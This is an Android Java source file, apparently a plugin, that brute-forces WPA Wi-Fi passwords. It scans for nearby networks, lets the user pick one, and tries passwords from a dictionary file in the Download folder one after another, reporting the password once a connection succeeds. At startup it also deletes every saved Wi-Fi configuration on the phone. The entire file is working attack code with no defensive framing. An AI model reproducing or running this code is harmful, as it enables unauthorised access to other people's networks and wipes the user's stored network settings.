package com.plugin.jPrlGSPKhr.WifiCarcker;


import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.*;
import android.os.Environment;

import java.io.FileNotFoundException;
import java.util.List;

public class WifiCarcker {

    private PasswordGetter passwordGetter; //获取密码
    private WifiManager mWifiManager;
    private List<WifiConfiguration> configs;
    private WifiConfiguration config;
    private WifiReceiver wifiReceiver;
    private int netid;
    private boolean cracking;
    private IntentFilter intentFilter;
    private int nowid = 0;
    private String password;
    private AccessPoint ap;
    private List<ScanResult> results = null;
    private AccessPoint tmpap;
    private ScanResult result;
    private Context context;
    private CommunicationToMainJS sendToMainJS;
    private WifiConfiguration  _APMC;

    //辅助方法 方便与js main函数对接
    public WifiCarcker(Context context, CommunicationToMainJS sendToMainJS) {

        this.context = context;
        this.sendToMainJS = sendToMainJS;
        startCarck();
    }

    public interface CommunicationToMainJS {

        public void sendLogd(String info);

        public void sendToast(String info);

        public void setProgress(int progress);

        public void showOption(String[] list);

        public void finish();

        public void showAlert(String title, String info);

        public void showConfirm(String title, String info);
    }


    public boolean startCarck(){

        try {
            passwordGetter = new PasswordGetter(getPath()+"password.txt");
        } catch (FileNotFoundException e) {
            sendToMainJS.showAlert("意外发生","无法初始化密码字典，重新下载密码字典,或手动添加到文件夹DownLoad/password.txt");
            ErrorInfoSend(e);
            return  false ;
        }

        //  mWifiManager = (WifiManager) getApplicationContext().getSystemService("wifi");
        mWifiManager = (WifiManager) context.getSystemService("wifi");

        //"检查wifi是否断开"
        if (!mWifiManager.isWifiEnabled()) { //判断是否开启
            sendToMainJS.sendLogd("开启wifi");
            mWifiManager.setWifiEnabled(true); // 开启WIFI
        }

        deleteSavedConfigs();
        cracking = false; //防止界面刷新,因为会重复扫描
        netid = -1;
        wifiReceiver = new WifiReceiver();
        intentFilter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
        intentFilter.addAction(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION);
        context.registerReceiver(wifiReceiver, intentFilter);
        mWifiManager.startScan(); // 开始扫描网络
        return  true;
    }


    class WifiReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
//            try {

                String action = intent.getAction();
                if (WifiManager.SCAN_RESULTS_AVAILABLE_ACTION.equals(action)) {
                    if (results == null){ //只初始化一次
                        results = mWifiManager.getScanResults();
                    }
                     sendToMainJS.sendLogd("开始筛选扫描结果结果");
                    if (cracking == false) {// 破解WIFI密码时不更新界面
                        addPreferenceFromScanResult();}
                } else if (WifiManager.SUPPLICANT_STATE_CHANGED_ACTION.equals(action)) {
                    WifiInfo info = mWifiManager.getConnectionInfo();
                    SupplicantState state = info.getSupplicantState();
                    String str = null;
                    if (state == SupplicantState.ASSOCIATED) {
                        nowid++;
                        str = "关联AP完成";
                    } else if (state.toString().equals("AUTHENTICATING")) {
                        str = "正在验证密码" + AccessPoint.removeDoubleQuotes(password); //移除双引号返回
                    } else if (state == SupplicantState.ASSOCIATING) {
                        str = "正在关联AP...";
                    } else if (state == SupplicantState.COMPLETED) { //如果连接成功

                        if (cracking) {
                            cracking = false;
                            Destroy();//销毁不在需要的br;
                            sendToMainJS.showConfirm("恭喜您，密码跑出来了！",
                                    "密码为："+ AccessPoint.removeDoubleQuotes(password)+"\n"+"是否现在去登录?");
                            return;
                        } else
                            str = "已连接";
                        passwordGetter.reSet();
                    } else if (state == SupplicantState.DISCONNECTED) {
                        str = "已断开";
                    } else if (state == SupplicantState.DORMANT) {
                        str = "暂停活动";
                    } else if (state == SupplicantState.FOUR_WAY_HANDSHAKE) {  //尝试连接中
                        str = "破解密码中.." + AccessPoint.removeDoubleQuotes(password)
                                + "  破解进行到第" + nowid + "个";
                    } else if (state == SupplicantState.GROUP_HANDSHAKE) {
                        str = "GROUP_HANDSHAKE";
                    } else if (state == SupplicantState.INACTIVE) {
                        str = "休眠中...";
                        if (cracking)
                            connectNetwork(); // 连接网络
                    } else if (state == SupplicantState.INVALID) {
                        str = "无效";
                    } else if (state == SupplicantState.SCANNING) {
                        str = "扫描中...";
                    } else if (state == SupplicantState.UNINITIALIZED) {
                        str = "未初始化";
                    }
                    sendToMainJS.sendLogd(str);
                    final int errorCode = intent.getIntExtra( WifiManager.EXTRA_SUPPLICANT_ERROR, -1);
                    if (errorCode == WifiManager.ERROR_AUTHENTICATING) {
                        sendToMainJS.sendLogd("WIFI验证失败！");
                        if (cracking == true)
                            connectNetwork();
                    }
                }


//
//            }catch (Exception e){
//
//                ErrorInfoSend(e);
//
//            }


    } }



    private String[] wifi_List;
   private boolean preference = false;
    //只运行一次
    private void addPreferenceFromScanResult() {
        if (results == null) {
            return;
        }
        wifi_List = new String[results.size()];

        for (int i = 0; i < results.size(); i++) {
            final ScanResult sr = results.get(i);
            tmpap = new AccessPoint(context, sr);
//            //是否存在
//            for (int k = 0; k < wifi_List.length; k++) {
//                sendToMainJS.sendLogd("wifi_List:"+wifi_List[k]);
//                if (wifi_List[k].contains(sr.SSID + "")) {
//                    preference = true;
//                    wifi_List[k] = "名称:" + sr.SSID + "  信号强度" + tmpap.getLevel();
//                }
//            }
//            if (preference == true) {
//                preference = false;
//                Log.d("TAG", "更新SSID：" + sr.SSID); //同名更新?
//                mWifiManager.updateNetwork(tmpap.mConfig); // 更新
//                mWifiManager.saveConfiguration();
//                continue;
//            }
            wifi_List[i] = "名称:" + sr.SSID + "  信号强度" + tmpap.getLevel();
            sendToMainJS.sendLogd("名称:" + sr.SSID + "  信号强度" + tmpap.getLevel());
        }

        sendToMainJS.sendLogd(wifi_List.toString());
        sendToMainJS.showOption(wifi_List);
    }


    public void OptionClick(int index) {

        sendToMainJS.sendLogd("开始破解");
        result = results.get(index);
        tmpap = new AccessPoint(context, result);

        if (tmpap.security == AccessPoint.SECURITY_NONE) {
            sendToMainJS.showAlert("无效破解","该AP没有加密，不需要破解！");
            return;
        } else if ((tmpap.security == AccessPoint.SECURITY_EAP)
                || (tmpap.security == AccessPoint.SECURITY_WEP)) {
            sendToMainJS.showAlert("无效破解","暂不支持EAP与WEP加密方式的破解！");
            return;
        }

        cracking = true;
        sendToMainJS.sendLogd("正在破解...");
        try {
            ap = tmpap;
            connectNetwork(); // 连接网络
        } catch (Exception e) {
            ErrorInfoSend(e);
        }

    }
    private void connectNetwork() {
        if (cracking) {
            _APMC= ap.mConfig;
            _APMC.priority = 1;
            _APMC.status = WifiConfiguration.Status.ENABLED;
            password = passwordGetter.getPassword(); // 从外部字典加载密码
            if (password == null || password.length() == 0) {
                sendToMainJS.sendLogd("抱歉强密码难以破解，常规密码本已猜解完毕，没有跑出密码！请等待升级版本在来试下");
                cracking = false;
                sendToMainJS.showAlert("404","抱歉强密码难以破解,常规密码本已猜解完毕,可手动更新密码本至DownLoad文件夹");
                return;
            }

            _APMC.preSharedKey = "\"" + password + "\""; // 设置密码

            if (netid == -1) {
                netid = mWifiManager.addNetwork(_APMC);
                _APMC.networkId = netid;
            } else {
                mWifiManager.updateNetwork(_APMC);
            }

            sendToMainJS.sendLogd("尝试连接:" + _APMC.SSID + "密码:" + _APMC.preSharedKey);

            // enableNetwork、saveConfiguration、reconnect为connectNetwork的实现
            if (mWifiManager.enableNetwork(netid, true)) {
                sendToMainJS.sendLogd("启用网络失败");
            }
            mWifiManager.saveConfiguration();
            mWifiManager.reconnect(); // 连接AP
        }
    }

    @SuppressLint("MissingPermission")
    private void deleteSavedConfigs() {

        sendToMainJS.sendLogd("清空记录");
        configs = mWifiManager.getConfiguredNetworks();
        for (int i = 0; i < configs.size(); i++) {
            config = configs.get(i);
            config.priority = i + 2; // 将优先级排后  优先级重0开始
            mWifiManager.removeNetwork(config.networkId);
        }
        mWifiManager.saveConfiguration();
    }

    public void Destroy() {
        if (passwordGetter != null)
            passwordGetter.Clean();
        if (wifiReceiver!=null)
        context.unregisterReceiver(wifiReceiver);
    }

    void ErrorInfoSend( Exception e){
         e.printStackTrace();
         StackTraceElement stackTraceElement= e.getStackTrace()[0];
         sendToMainJS.sendLogd("File="+stackTraceElement.getFileName());
        sendToMainJS.sendLogd("Line="+stackTraceElement.getLineNumber());
        sendToMainJS.sendLogd("Method="+stackTraceElement.getMethodName());
    }

    String getPath() {
        //返回系统路径
        return Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + Environment.DIRECTORY_DOWNLOADS + "/";
    }


}